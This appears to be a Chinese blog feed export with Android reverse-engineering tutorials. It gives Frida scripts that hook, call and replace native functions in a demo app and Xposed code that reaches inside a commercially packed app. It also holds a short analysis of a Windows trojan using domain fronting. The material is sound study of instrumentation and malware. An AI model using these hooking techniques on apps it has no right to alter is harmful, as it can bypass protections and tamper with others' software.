<pre><code class="js">Java.use("com.xiaoeryu.demoso1.MainActivity").stringFromJNI.implementation = function(){
            var result = this.stringFromJNI();
            console.log("stringFromJNI result is =&gt; ", result);
            return result;
        }
        console.log("invoke stringFromJNI: " + Java.use('com.xiaoeryu.demoso1.MainActivity').stringFromJNI);
</code></pre>
<h4 id="Java层非静态函数"><a href="#Java层非静态函数" class="headerlink" title="Java层非静态函数"></a>Java层非静态函数</h4><img src="/2024/03/24/Frida%E5%9F%BA%E7%A1%80hook%E6%B1%87%E6%80%BB/image-20240813223719102.png" class="" title="image-20240813223719102">

<p>hook和主动调用代码：这个函数没写返回值，我们就只打印一个log</p>
<pre><code class="js">        Java.use('com.xiaoeryu.demoso1.MainActivity').init.implementation = function(){
            console.log("hook init successfully!");
            return this.init;
        }
        Java.choose('com.xiaoeryu.demoso1.MainActivity',{
            onMatch:function(instance){
                console.log('Found instance');
                instance.init();
            },onComplete:function(){console.log('Search complete!')}
        })
</code></pre>
<h4 id="静态注册函数的native层hook"><a href="#静态注册函数的native层hook" class="headerlink" title="静态注册函数的native层hook"></a>静态注册函数的native层hook</h4><img src="/2024/03/24/Frida%E5%9F%BA%E7%A1%80hook%E6%B1%87%E6%80%BB/image-20240813223727397.png" class="" title="image-20240813223727397">

<ul>
<li><p>对于第三方App通过查找它的导出函数可以获取获取完整函数名<em>（如果不是调用RegisterNatives进行的动态注册的话）</em>。用ida或者objection中的<code>memory list exports 库名.so</code>都可以</p>
<img src="/2024/03/24/Frida%E5%9F%BA%E7%A1%80hook%E6%B1%87%E6%80%BB/image-20240319221232058.png" class="" title="image-20240319221232058">

<img src="/2024/03/24/Frida%E5%9F%BA%E7%A1%80hook%E6%B1%87%E6%80%BB/image-20240319221328508.png" class="" title="image-20240319221328508"></li>
</ul>
<p>native层的hook不需要Java.perform因为它已经不在虚拟机中了。</p>
<blockquote>
<ol>
<li><p>找到native的so名称和函数的完整名</p>
<p>通过so库的名称和函数名找到函数地址</p>
</li>
<li><p>找到函数地址之后就可以通过<code>Interceptor.attach()</code>去hook这个函数获取它的参数或者返回值了</p>
<p>需要注意的一点是，我们使用frida脚本去打印native层的参数的时候，直接打印的话只能打印它的地址，需要根据参数类型使用Frida提供的方法去解析<em>（下面的代码以jstring为例）</em></p>
</li>
</ol>
</blockquote>
<pre><code class="js">function hook_nativelib(){
    var nativelib_addr = Module.findBaseAddress('libdemoso1.so');
    console.log("nativelib_addr is =&gt; ", nativelib_addr);

    var myfirstjniJNI_addr = Module.findExportByName('libdemoso1.so','Java_com_xiaoeryu_demoso1_MainActivity_myfirstjniJNI');
    console.log("myfirstjniJNI_addr is =&gt; ", myfirstjniJNI_addr);

    Interceptor.attach(myfirstjniJNI_addr, {
        onEnter: function(args){
            console.log("Interceptor.attach myfristjniJNI args: ", args[0], args[1], args[2]);
            console.log("args[2] jstring is ", Java.vm.getEnv().getStringUtfChars(args[2],null).readCString());
        },onLeave:function(retval){
            console.log("Interceptor.attach myfirstjniJNI retval: ", retval);
            console.log("retval jstring is ", Java.vm.getEnv().getStringUtfChars(retval, null).readCString());
        }
    })
}
</code></pre>
<hr>
<h3 id="一些hook技巧"><a href="#一些hook技巧" class="headerlink" title="一些hook技巧"></a>一些hook技巧</h3><p>静态注册函数参数、返回值打印和替换</p>
<p>调用栈</p>
<p>主动调用、replace</p>
<p>符号hook == 偏移hook</p>
<p>枚举并保存结果</p>
<h4 id="替换native层的参数和返回值"><a href="#替换native层的参数和返回值" class="headerlink" title="替换native层的参数和返回值"></a>替换native层的参数和返回值</h4><p>这里还是以前面hook的目标app中的目标函数为例</p>
<img src="/2024/03/24/Frida%E5%9F%BA%E7%A1%80hook%E6%B1%87%E6%80%BB/image-20240813223758918.png" class="" title="image-20240813223758918">

<ul>
<li>这个native函数的类型是jstring，它的返回值类型是使用Java提供的方法创建一个字符串来返回，所以我们要改变返回值同样也需要使用相同的类型来替换</li>
</ul>
<p>这里查看<a href="https://github.com/frida/frida-java-bridge/blob/main/lib/env.js">Frida的源码</a>提供的方法</p>
<img src="/2024/03/24/Frida%E5%9F%BA%E7%A1%80hook%E6%B1%87%E6%80%BB/image-20240813223807354.png" class="" title="image-20240813223807354">

<p>测试代码</p>
<img src="/2024/03/24/Frida%E5%9F%BA%E7%A1%80hook%E6%B1%87%E6%80%BB/image-20240320183427207.png" class="" title="image-20240320183427207">

<ul>
<li>这里替换掉了它的参数和返回值，只需要调用Frida提供的方法创建一个新的字符串，然后直接替换就可以了</li>
</ul>
<h4 id="C函数主动调用"><a href="#C函数主动调用" class="headerlink" title="C函数主动调用"></a>C函数主动调用</h4><p>先拿一个简单的C函数来进行测试，它没有复杂的参数</p>
<img src="/2024/03/24/Frida%E5%9F%BA%E7%A1%80hook%E6%B1%87%E6%80%BB/image-20240320210250576.png" class="" title="image-20240320210250576">

<ul>
<li>还是跟之前一样，不论是想对native层的函数进行hook还是主动调用都需要先找到它的地址，然后才能进行hook或者主动调用</li>
</ul>
<img src="/2024/03/24/Frida%E5%9F%BA%E7%A1%80hook%E6%B1%87%E6%80%BB/image-20240320202658138.png" class="" title="image-20240320202658138">

<ul>
<li>通过函数名来找到它的地址，函数名要使用它在内存中的名字，这里的名字跟原本函数名字不同是因为它做了demangler处理，可以在<a href="http://demangler.com/">解码网站</a>对它进行解码处理</li>
</ul>
<pre><code class="js">function hookAndInvoke_add(){
    // 获取函数地址
    var r0add_addr = Module.findExportByName('libdemoso1.so', '_Z5r0addii');
    console.log("r0add_addr is =&gt; ", r0add_addr);
    // hook函数
    Interceptor.attach(r0add_addr, {
        onEnter: function(args){
            console.log("x =&gt; ", args[0], "y =&gt; ", args[1]);
        },onLeave:function(retval){
            console.log("retval =&gt; ", retval);
        }
    })
    // 进行主动调用
    var r0add = new NativeFunction(r0add_addr, 'int', ['int', 'int']);
    var r0add_result = r0add(1, 2);
    // 打印返回值
    console.log("r0add_result =&gt; ", r0add_result);
}
</code></pre>
<p>执行结果：</p>
<img src="/2024/03/24/Frida%E5%9F%BA%E7%A1%80hook%E6%B1%87%E6%80%BB/image-20240320210800273.png" class="" title="image-20240320210800273">

<h4 id="JNI函数主动调用"><a href="#JNI函数主动调用" class="headerlink" title="JNI函数主动调用"></a>JNI函数主动调用</h4><p>还以我们之前hook的<em>myfirstjniJNI</em>的native层实现为例，对它的调用需要我们先构造它的参数第一个参数env第二个参数jclass接下来才是传入的参数</p>
<img src="/2024/03/24/Frida%E5%9F%BA%E7%A1%80hook%E6%B1%87%E6%80%BB/image-20240320215347716.png" class="" title="image-20240320215347716">

<ul>
<li><p>如上图按这个函数的参数和返回值，先定义一个NativeFunction，然后进行主动调用。其实和刚才调用C函数差不多</p>
</li>
<li><p>但是如果我们在app源码中没有执行过这个函数的话，就需要再使用*Java.use()*在java层调用一下这个函数</p>
<img src="/2024/03/24/Frida%E5%9F%BA%E7%A1%80hook%E6%B1%87%E6%80%BB/image-20240320220303783.png" class="" title="image-20240320220303783"></li>
</ul>
<h4 id="调用栈"><a href="#调用栈" class="headerlink" title="调用栈"></a>调用栈</h4><p>获取调用栈需要用到Frida提供的*backtrace()*方法</p>
<img src="/2024/03/24/Frida%E5%9F%BA%E7%A1%80hook%E6%B1%87%E6%80%BB/image-20240813223827216.png" class="" title="image-20240813223827216">

<p>使用提供的方法可以在onEnter的时候打印出来</p>
<img src="/2024/03/24/Frida%E5%9F%BA%E7%A1%80hook%E6%B1%87%E6%80%BB/image-20240321174439161.png" class="" title="image-20240321174439161">

<p>打印调用栈其实提供了两种方法</p>
<img src="/2024/03/24/Frida%E5%9F%BA%E7%A1%80hook%E6%B1%87%E6%80%BB/image-20240321175641965.png" class="" title="image-20240321175641965">

<ul>
<li>ACCURATE这种方法，如果在有调试信息的情况下可以获取非常精准的结果</li>
<li>反之或许FUZZY这个猜测的方式效果更好</li>
<li>实际使用可以两者结合起来使用</li>
</ul>
<h4 id="replace"><a href="#replace" class="headerlink" title="replace"></a>replace</h4><p>流程跟之前也是一样，找到函数地址后使用*Interceptor.replace()*直接替换就好了</p>
<pre><code class="js">function hook_replace(){
    var myfirstjniJNI_addr = Module.findExportByName('libdemoso1.so', 'Java_com_xiaoeryu_demoso1_MainActivity_myfirstjniJNI');
    console.log("myfirstjniJNI_addr is =&gt; ", myfirstjniJNI_addr);

    // var myfirstjniJNI_invoke = new NativeFunction(myfirstjniJNI_addr, 'pointer', ['pointer', 'pointer', 'pointer']);

    Interceptor.replace(myfirstjniJNI_addr, new NativeCallback(function(args0, args1, args2){
        console.log("Interceptor.replace myfirstjniJNI args: ", args0, args1, args2);
        return Java.vm.getEnv().newStringUtf("hookedReplaceXiaoyu");
    }, 'pointer', ['pointer', 'pointer', 'pointer']
    ))
}
</code></pre>
<p>替换成功</p>
<img src="/2024/03/24/Frida%E5%9F%BA%E7%A1%80hook%E6%B1%87%E6%80%BB/image-20240321195508809.png" class="" title="image-20240321195508809">

<h4 id="枚举所有函数"><a href="#枚举所有函数" class="headerlink" title="枚举所有函数"></a>枚举所有函数</h4><p>使用Frida提供的API，枚举所有非动态注册的函数，然后再进行过滤找到想要寻找的就ok了</p>
<pre><code class="js">function EnumerateAllExports(){
    var modules = Process.enumerateModules();
    // console.log("modules is =&gt; ", JSON.stringify(modules));
    for(var i = 0; i &lt; modules.length; i++){
        var module = modules[i];
        var name = module.name;
        var exports = module.enumerateExports();
        console.log("name is =&gt; ", JSON.stringify(name), "export is =&gt; ", JSON.stringify(exports));
    }
}
</code></pre>
<img src="/2024/03/24/Frida%E5%9F%BA%E7%A1%80hook%E6%B1%87%E6%80%BB/image-20240321203617680.png" class="" title="image-20240321203617680">

<h3 id="hook内容的补充"><a href="#hook内容的补充" class="headerlink" title="hook内容的补充"></a>hook内容的补充</h3><p>前面进行的所有hook或者主动调用、替换，都是找到目标函数的地址然后对这个函数进行操作。所以本质上都是对这个函数的地址进行hook（虽然使用ida也能找到目标函数的地址和基址，不过如果是动态加载的话它的地址是会变的。所以还是使用调用Frida提供的API获取地址比较方便）。</p>
<h4 id="Frida提供的其它API"><a href="#Frida提供的其它API" class="headerlink" title="Frida提供的其它API"></a>Frida提供的其它API</h4><p>详细信息可以看Frida提供的<a href="https://frida.re/docs/javascript-api/#nativepointer">文档</a>，提供了很多的方法来获取更多的信息</p>
<h5 id="Process"><a href="#Process" class="headerlink" title="Process"></a>Process</h5><blockquote>
<img src="/2024/03/24/Frida%E5%9F%BA%E7%A1%80hook%E6%B1%87%E6%80%BB/image-20240321211322713.png" class="" title="image-20240321211322713">

<ul>
<li>例如这里面的一些API，我们使用Frida附加到app之后就可以直接使用</li>
</ul>
<img src="/2024/03/24/Frida%E5%9F%BA%E7%A1%80hook%E6%B1%87%E6%80%BB/image-20240321212229466.png" class="" title="image-20240321212229466">
</blockquote>
<h5 id="Module"><a href="#Module" class="headerlink" title="Module"></a>Module</h5><blockquote>
<p>枚举模块的信息，具体都能枚举什么东 西可以在Frida的<a href="https://frida.re/docs/javascript-api/#nativepointer">文档</a>中查看</p>
<pre><code class="js">// 第一种方式
function module(){
 var nativelib_addr = Process.findModuleByAddress(Module.findBaseAddress("libutils.so"));
 // var nativelib_addr = Process.findModuleByAddress(Module.findBaseAddress("libdemoso1.so"));
 // console.log("nativelib_addr =&gt; ", JSON.stringify(nativelib_addr));
 for(var i = 0; i &lt; nativelib_addr.enumerateImports().length; i++){
     console.log("enumerateSymbols =&gt; ", JSON.stringify(nativelib_addr.enumerateImports()[i]));
 }
}
// 第二种方式
function test(){
 Java.perform(function(){
     var imports = Module.enumerateImports("libutils.so");
     for(var i = 0; i &lt; imports.length; i++){
         console.log("imports =&gt; ", JSON.stringify(imports[i]));
     }
 })
}
</code></pre>
<ul>
<li>第一种获取到目标so的地址，通过枚举找出模块的信息</li>
<li>第二种更直接一点，直接用模块名枚举就行了</li>
</ul>
</blockquote>
<p>等等更多的不再列举，都可以通过Frida的<a href="https://frida.re/docs/javascript-api/#nativepointer">文档</a>查看使用方法</p>
<h6 id="附件："><a href="#附件：" class="headerlink" title="附件："></a>附件：</h6><p><a href="https://github.com/xiaoeeyu/demoso1">demo源码</a></p>
<p><a href="https://github.com/xiaoeeyu/FridaHook-/blob/main/fridaHook_01.js">Frida Hook脚本</a></p>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>Frida Hook</tag>
      </tags>
  </entry>
  <entry>
    <title>Hook加壳app</title>
    <url>/2023/12/20/Hook%E5%8A%A0%E5%A3%B3app/</url>
    <content><![CDATA[<p>本章主要分析怎么处理加壳app</p>
<p>之前几篇文章编写的Xposed插件都是在没有加壳的情况下编写的，如果加壳后应该怎么处理</p>
<p>在应用内部代码被加固的情况下，如何hook到内部代码</p>
<blockquote>
<ol>
<li><p>因为ClassLoader是壳的ClassLoader</p>
<p>因为Xposed框架Hook的时机是比较早的，如果一个app加壳了，那么Xposed hook默认使用的ClassLoader默认使用的是壳程序的ClassLoader，这个时候我们去hook，只能hook到壳代码。是无法hook到应用内部的代码的。</p>
</li>
<li><p>要获取到应用本身的ClassLoader</p>
<p>因为app最先获得执行权限的是app中声明的Application类中的<code>attachBaseContext</code>和<code>onCreate</code>函数，因此壳要想完成应用中加固代码的解密以及执行权的交付就都是在这两个函数上做文章，我们需要当前壳在函数<code>attachBaseContext</code>和<code>onCreate</code>中执行完加密的dex文件的解密后，通过利用java的反射机制获取到应用运行中的ClassLoader。拿到之后就可以对应用本身的函数进行hook了</p>
</li>
</ol>
</blockquote>
<h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><p>这里从网上下载了一个漫画的小APP</p>
<img src="/2023/12/20/Hook%E5%8A%A0%E5%A3%B3app/image-20231220021940214.png" class="" title="image-20231220021940214">

<ul>
<li>GDA打开后可以看到是一个360的壳，正常来说我们要先脱壳拿到dex分析之后再来进行hook</li>
<li>但是暂时现在手里没那么多设备刷来刷去比较麻烦，这里也只验证流程可行性达到目的就可以</li>
</ul>
<h3 id="开始编写插件"><a href="#开始编写插件" class="headerlink" title="开始编写插件"></a>开始编写插件</h3><p>例如我们尝试一下直接hook它里面的<code>com.stub.StubApp.onCreate</code></p>
<img src="/2023/12/20/Hook%E5%8A%A0%E5%A3%B3app/image-20231220163944007.png" class="" title="image-20231220163944007">

<p>代码片段</p>
<pre><code class="java">XposedHelpers.findAndHookMethod("com.stub.StubApp", loadPackageParam.classLoader, "onCreate", new XC_MethodHook() {
                @Override
                protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                    super.beforeHookedMethod(param);
                    XposedBridge.log("com.stub.StubApp-&gt;beforeHookedMethod-&gt;onCreate: " + param.thisObject);
                    XposedBridge.log("com.stub.StubApp: " + loadPackageParam.classLoader);
                }
</code></pre>
<p>成功的hook了壳的<code>onCreate</code>函数</p>
<img src="/2023/12/20/Hook%E5%8A%A0%E5%A3%B3app/image-20231220164436136.png" class="" title="image-20231220164436136">

<p>然后，我们就可以通过反射去获取当前运行的ClassLoader，来hook原有应用的函数了。</p>
<h3 id="获取ClassLoader"><a href="#获取ClassLoader" class="headerlink" title="获取ClassLoader"></a>获取ClassLoader</h3><p>代码片段</p>
<pre><code class="java">    public static ClassLoader getClassloader() {
        ClassLoader resultClassloader = null;

        // 使用XposedHelpers.findClass找到ActivityThread类
        Class&lt;?&gt; activityThreadClass = XposedHelpers.findClass("android.app.ActivityThread", null);

        // 调用currentActivityThread静态方法获取当前ActivityThread对象
        Object currentActivityThread = XposedHelpers.callStaticMethod(activityThreadClass, "currentActivityThread");

        // 获取mBoundApplication字段的值
        Object mBoundApplication = XposedHelpers.getObjectField(currentActivityThread, "mBoundApplication");

        // 获取LoadedApk对象
        Object loadedApkInfo = XposedHelpers.getObjectField(mBoundApplication, "info");

        // 获取mApplication字段的值
        Application mApplication = (Application) XposedHelpers.getObjectField(loadedApkInfo, "mApplication");

        // 获取ClassLoader
        resultClassloader = mApplication.getClassLoader();

        return resultClassloader;
    }
</code></pre>
<ul>
<li><p>这样就可以通过反射和Xposed提供的api来获取当前程序的ClassLoader</p>
</li>
<li><p>拿到ClassLoader之后就可以hook当前程序的代码了</p>
</li>
<li><p>不过我们现在还不知道它的类名是什么以及类里面有哪些方法，可以去AndroidManifest里面找找看</p>
<blockquote>
<img src="/2023/12/20/Hook%E5%8A%A0%E5%A3%B3app/image-20231220185214645.png" class="" title="image-20231220185214645">

<ul>
<li>比如说这里我们可以hook它的MainActivity_类，它里面肯定有<code>onCreate</code>方法</li>
<li>当然我们也可以用获取到的ClassLoader把类中的类列表全部打印出来（放在文章末尾单独介绍一下）</li>
</ul>
</blockquote>
</li>
</ul>
<h3 id="hook解密后程序中的方法"><a href="#hook解密后程序中的方法" class="headerlink" title="hook解密后程序中的方法"></a>hook解密后程序中的方法</h3><p>代码片段</p>
<pre><code class="java">// 获取当前ClassLoader
ClassLoader finalClassLoader = getClassloader();
XposedBridge.log("finalClassLoader: " + finalClassLoader);
// 打印类中的所有方法
Class MainActivity_Class = XposedHelpers.findClass("com.omyga.app.ui.activity.MainActivity_",finalClassLoader);
Method[] methods = MainActivity_Class.getDeclaredMethods();
for (Method i:methods){
    XposedBridge.log("com.omyga.app.ui.activity.MainActivity_: " + i);
}

// hook方法
XposedHelpers.findAndHookMethod("com.omyga.app.ui.activity.MainActivity_", finalClassLoader, "onCreate", Bundle.class, new XC_MethodHook() {
    @Override
    protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
        super.beforeHookedMethod(param);
        XposedBridge.log("beforeHookedMethod com.omyga.app.ui.activity.MainActivity_.onCreate");
    }
</code></pre>
<p>成功的hook了MainActivity_中的<code>onCreate</code>函数</p>
<img src="/2023/12/20/Hook%E5%8A%A0%E5%A3%B3app/image-20231220190434206.png" class="" title="image-20231220190434206">

<p>总结：这样我们就成功的hook到了加壳app中的函数，其实步骤也不是很复杂。不过里面有一些细节例如获取ClassLoader和类加载的函数列表，需要我们对源码有一定的了解才能通过反射获取到。</p>
<hr>
<p>加壳app的hook流程也比较简单，下面分析一下获取类中所有方法的原理</p>
<h3 id="分析如何获取dex中的类列表"><a href="#分析如何获取dex中的类列表" class="headerlink" title="分析如何获取dex中的类列表"></a>分析如何获取dex中的类列表</h3><p>这里先打印一下它的双亲委派关系，看看它是使用<code>PathClassLoader</code>还是<code>DexClassLoader</code>或者其它的ClassLoader加载的dex</p>
<pre><code class="java">            ClassLoader classLoader = loadPackageParam.classLoader;

            XposedBridge.log("loadPackageParam.classLoader: " + classLoader);
            ClassLoader parent = classLoader.getParent();
            while (parent != null) {
                XposedBridge.log("lebo-&gt;parent: " + parent);
                parent = parent.getParent();
            }
</code></pre>
<pre><code>loadPackageParam.classLoader: dalvik.system.PathClassLoader[DexPathList[[zip file "/data/app/com.f0208.lebo-_PxU7X4MfMsuNOqGdX74Vw==/base.apk"],nativeLibraryDirectories=[/data/app/com.f0208.lebo-_PxU7X4MfMsuNOqGdX74Vw==/lib/arm, /data/app/com.f0208.lebo-_PxU7X4MfMsuNOqGdX74Vw==/base.apk!/lib/armeabi-v7a, /system/lib, /vendor/lib, /system/product/lib]]]
lebo-&gt;parent: java.lang.BootClassLoader@8e4a8a6
</code></pre>
<ul>
<li>通过这段打印出来的信息我们可以知道，这里使用了<code>PathClassLoader</code>来加载dex</li>
<li>至于<code>BootClassLoader</code>是根节点</li>
</ul>
<h4 id="回顾一下之前学习FART脱壳的时候分析过的源码"><a href="#回顾一下之前学习FART脱壳的时候分析过的源码" class="headerlink" title="回顾一下之前学习FART脱壳的时候分析过的源码"></a>回顾一下之前学习FART脱壳的时候分析过的源码</h4><p>在dex修复的过程中可以找到当前ClassLoader加载的所有类</p>
<p>首先在源码的<strong>libcore</strong>文件找到<code>PathClassLoader</code></p>
<img src="/2023/12/20/Hook%E5%8A%A0%E5%A3%B3app/image-20231218011816925.png" class="" title="image-20231218011816925">

<pre><code class="java">/**
 * Provides a simple {@link ClassLoader} implementation that operates on a list
 * of files and directories in the local file system, but does not attempt to
 * load classes from the network. Android uses this class for its system class
 * loader and for its application class loader(s).
 */
public class PathClassLoader extends BaseDexClassLoader {
    /**
     * Creates a {@code PathClassLoader} that operates on a given list of files
     * and directories. This method is equivalent to calling
     * {@link #PathClassLoader(String, String, ClassLoader)} with a
     * {@code null} value for the second argument (see description there).
     *
     * @param dexPath the list of jar/apk files containing classes and
     * resources, delimited by {@code File.pathSeparator}, which
     * defaults to {@code ":"} on Android
     * @param parent the parent class loader
     */
    public PathClassLoader(String dexPath, ClassLoader parent) {
        super(dexPath, null, null, parent);
    }

    /**
     * Creates a {@code PathClassLoader} that operates on two given
     * lists of files and directories. The entries of the first list
     * should be one of the following:
     *
     * &lt;ul&gt;
     * &lt;li&gt;JAR/ZIP/APK files, possibly containing a "classes.dex" file as
     * well as arbitrary resources.
     * &lt;li&gt;Raw ".dex" files (not inside a zip file).
     * &lt;/ul&gt;
     *
     * The entries of the second list should be directories containing
     * native library files.
     *
     * @param dexPath the list of jar/apk files containing classes and
     * resources, delimited by {@code File.pathSeparator}, which
     * defaults to {@code ":"} on Android
     * @param librarySearchPath the list of directories containing native
     * libraries, delimited by {@code File.pathSeparator}; may be
     * {@code null}
     * @param parent the parent class loader
     */
    public PathClassLoader(String dexPath, String librarySearchPath, ClassLoader parent) {
        super(dexPath, null, librarySearchPath, parent);
    }

    /**
     * @hide
     */
    @libcore.api.CorePlatformApi
    public PathClassLoader(
            String dexPath, String librarySearchPath, ClassLoader parent,
            ClassLoader[] sharedLibraryLoaders) {
        super(dexPath, librarySearchPath, parent, sharedLibraryLoaders);
    }
}
</code></pre>
<ul>
<li><code>PathClassLoader</code>继承自<code>BaseDexClassLoader</code>，它没有自己的属性，继续跟进<code>BaseDexClassLoader</code></li>
</ul>
<pre><code class="java">public class BaseDexClassLoader extends ClassLoader {

    /**
     * Hook for customizing how dex files loads are reported.
     *
     * This enables the framework to monitor the use of dex files. The
     * goal is to simplify the mechanism for optimizing foreign dex files and
     * enable further optimizations of secondary dex files.
     *
     * The reporting happens only when new instances of BaseDexClassLoader
     * are constructed and will be active only after this field is set with
     * {@link BaseDexClassLoader#setReporter}.
     */
    /* @NonNull */ private static volatile Reporter reporter = null;

    @UnsupportedAppUsage
    private final DexPathList pathList;
    
    ...
</code></pre>
<ul>
<li><p>在这里可以看到DexPathList定义了一个重要的属性<strong>pathList</strong></p>
</li>
<li><p>继续跟进<code>DexPathList</code></p>
</li>
</ul>
<pre><code class="java">public final class DexPathList {
    private static final String DEX_SUFFIX = ".dex";
    private static final String zipSeparator = "!/";

    /** class definition context */
    @UnsupportedAppUsage
    private final ClassLoader definingContext;

    /**
     * List of dex/resource (class path) elements.
     * Should be called pathElements, but the Facebook app uses reflection
     * to modify 'dexElements' (http://b/7726934).
     */
    @UnsupportedAppUsage
    private Element[] dexElements;
    
    ...
</code></pre>
<ul>
<li>这里的<code>dexElements</code>数组，就保存有当前ClassLoader加载的所有dex</li>
</ul>
<h4 id="获取所有加载的类"><a href="#获取所有加载的类" class="headerlink" title="获取所有加载的类"></a>获取所有加载的类</h4><p>通过反射拿到<code>ClassList</code></p>
<pre><code class="java">    public void GetClassLoaderClasslist(ClassLoader classLoader){
        XposedBridge.log("lebo-&gt;start dealwith classLoader: " + classLoader);
        // private final DexPathList pathList;
        Object pathListObj = XposedHelpers.getObjectField(classLoader, "pathList");
        // private Element[] dexElements;
        Object[] dexElementsObj = (Object[]) XposedHelpers.getObjectField(pathListObj,"dexElements");
        for (Object i:dexElementsObj){
            // private final DexFile dexFile;
            Object dexFileObj = XposedHelpers.getObjectField(i,"dexFile");
            // private Object mCookie;
            Object mCookieObj = XposedHelpers.getObjectField(dexFileObj,"mCookie");
            // private static native String[] getClassNameList(Object cookie);
            // callStarticMethod可以调用静态Native函数
            Class DexFileClass = XposedHelpers.findClass("dalvik.system.DexFile",classLoader);
            String[] classNameList = (String[]) XposedHelpers.callStaticMethod(DexFileClass,"getClassNameList",mCookieObj);
            for (String j:classNameList){
                XposedBridge.log(dexFileObj+ "---" + j);
            }
        }
        XposedBridge.log("lebo-&gt;end dealwith classLoader: " + classLoader);
    }
</code></pre>
<ul>
<li><p>通过反射一步步拿到DexFile中的mCookie</p>
</li>
<li><p>用mCookie作为参数调用库中的native函数<code>getClassNameList</code>获取到当前ClassLoader加载的所有类名</p>
<img src="/2023/12/20/Hook%E5%8A%A0%E5%A3%B3app/image-20231218133039765.png" class="" title="image-20231218133039765"></li>
</ul>
<p><a href="https://github.com/xiaoeeyu/Xposed01/blob/master/app/src/main/java/com/xiaoeryu/xposed01/HookHHLZ.java">本章源码</a></p>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>Frida Hook</tag>
        <tag>Xposed插件开发</tag>
      </tags>
  </entry>
  <entry>
    <title>HW样本分析</title>
    <url>/2021/05/21/HW%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h3 id="0x00-样本信息"><a href="#0x00-样本信息" class="headerlink" title="0x00 样本信息"></a>0x00 样本信息</h3><p>​	HW期间拿到的一个样本，用了lnk的启动方式。运行后会启动隐藏属性的exe和dll文件，进行后续的内存解密操作后用域前置的方法执行外联操作。</p>
<span id="more"></span>

<h3 id="0x01-行为分析"><a href="#0x01-行为分析" class="headerlink" title="0x01 行为分析"></a>0x01 行为分析</h3><ol>
<li><p>行为分析</p>
<p>样本解压后可以看到两个文件：一个excle表，一个pdf快捷方式。excle表查看后是一个正常的文件。</p>
<img src="/2021/05/21/HW%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20210523160235108.png" class="" title="image-20210523160235108">

<p>通过火绒剑行为监控可以看到快捷方式执行后会有一些启动bat脚本和外连等行为</p>
<p>根据bat文件可以看到lnk文件执行之后，运行的主体为sihost.exe &amp; MpSvc.dll，接下来跟据前面监测到的的一些行为对这两个文件进行详细分析。</p>
<img src="/2021/05/21/HW%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20210524114643659.png" class="" title="image-20210524114643659">

<img src="/2021/05/21/HW%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20210523161133203.png" class="" title="image-20210523161133203">

<h3 id="0x02-调试分析"><a href="#0x02-调试分析" class="headerlink" title="0x02 调试分析"></a>0x02 调试分析</h3><p>用ida查看sihost.exe的函数调用视图可以看到调用过程非常简单，启动函数调用了三个函数sub-401104获取了一些信息并未做什么后续的操作，所以主要从DLL的ServiceCrtMain函数开始分析</p>
<img src="/2021/05/21/HW%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20210523162746448.png" class="" title="image-20210523162746448">

<img src="/2021/05/21/HW%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20210523163951134.png" class="" title="image-20210523163951134">

<p>顺便看一下dll用到了非常多的导入函数</p>
<img src="/2021/05/21/HW%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20210523161510791.png" class="" title="image-20210523161510791">

<p>进入mpsvc.dll后可以看到首先创建了一个互斥体来防止多开，继续往下调试</p>
<img src="/2021/05/21/HW%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20210523221615770.png" class="" title="image-20210523221615770">

<p>可以看到此处VirtualAlloc在0x130000处开辟了一块可读可写可执行的空间，之后又往这片内存写入了一个PE文件</p>
<img src="/2021/05/21/HW%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20210523221905856.png" class="" title="image-20210523221905856">

<p>前面用火绒剑抓取到了有外链的操作，在进入这个地方已经加载网络通信相关dll后，可以直接下HttpSendRequestA等网络链接相关断点</p>
<img src="/2021/05/21/HW%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20210523232014720.png" class="" title="image-20210523232014720">

<p>继续往下执行，可以看到又使用virtualalloc开辟了一块空间</p>
<img src="/2021/05/21/HW%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20210523232805093.png" class="" title="image-20210523232805093">

<p>此时可以选择F9直接执行会断在HttpSendRequestA处，就可以看到链接的域名C2</p>
<img src="/2021/05/21/HW%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20210523234035732.png" class="" title="image-20210523234035732"></li>
</ol>
<p>可以看到链接的C2是一个高信誉的域名，这个地方是采用了域前置的方式，去访问用同一个CDN加速的另一个域名。</p>
]]></content>
      <categories>
        <category>样本分析</category>
      </categories>
      <tags>
        <tag>windows木马</tag>
      </tags>
  </entry>
  <entry>
    <title>Hook多dex的app</title>
    <url>/2023/12/25/Hook%E5%A4%9Adex%E7%9A%84app/</url>
    <content><![CDATA[<p>本章内容为多dex的hook</p>
<p>之前一章分析了对加壳的app进行hook，但是在多dex的情况下我们可能并不知道哪个ClassLoader加载了我们想要hook的dex。</p>
<span id="more"></span>

<p>实际上对加固app的处理也是对多dex处理的一个特例，因为加固的app也是加载了多次dex（首先加载壳的dex其次再加载应用本身的dex）。</p>
<p>加固的app有一个特殊的流程在于需要修正原来的ClassLoader但是如果app加载多个dex的话，我们拿到的就不一定是我们想要hook的ClassLoader了。</p>
<p>比如说在热更新的时候，从云端动态下发的dex其代码逻辑都下下发的这个dex当中。然后通过dexClassLoader去加载这个dex再调用其中的某个函数。</p>
<p>这时候的主要问题就是我们想要hook的类到底再哪一个ClassLoader当中。</p>
<p>这里拿之前写过的使用DexClassLoader来加载dex的app，作为例子来分析一下。</p>
<p>先安装运行一下这个app</p>
<img src="/2023/12/25/Hook%E5%A4%9Adex%E7%9A%84app/image-20231222115155263.png" class="" title="image-20231222115155263">

<center>图1</center>

<ul>
<li>这里可以看到有一个单独的线程一直在输出<strong>Sorry！</strong></li>
</ul>
<p>用jadx打开看一下是从哪输出的</p>
